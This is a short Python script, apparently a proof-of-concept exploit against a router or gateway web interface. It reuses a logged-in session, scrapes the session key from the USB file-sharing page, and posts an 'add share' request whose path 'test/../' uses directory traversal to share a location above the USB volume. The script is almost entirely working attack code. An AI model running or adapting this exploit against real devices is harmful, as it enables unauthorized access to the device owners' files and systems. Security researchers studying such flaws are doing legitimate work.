import requests
import impat
impat.addfolder('python')
from FunCom import find_between
from session import login, host, cookies

if login.status_code == requests.codes.ok and cookies['SESSION'] is not '':
    print('=~=~=~=~=~=~=~=~=~=~=~=                               =~=~=~=~=~=~=~=~=~=~=~=')
    f = requests.get('http://%s/pages/network/usbService/fileSharing.html' % host, cookies=login.cookies)
    glbSessionKey = find_between(f.text, "var glbSessionKey = '", "';")

    shradd = {"action": "add", "sessionKey": glbSessionKey,
              "LogicalVolumeSelect": "usb1_1",
              "AddSharePath": "test/../",
              "AddShareDesc": "allyourbox2",
              "AddShareAccess": "1",
              "AddShareName": "usb1_1",
              "SecurityAllowUser": ""}
    p = requests.post('http://%s/pages/tabFW/usbService-fileSharing_add.cmd' % host, cookies=login.cookies, data=shradd)
    print(f, shradd, p)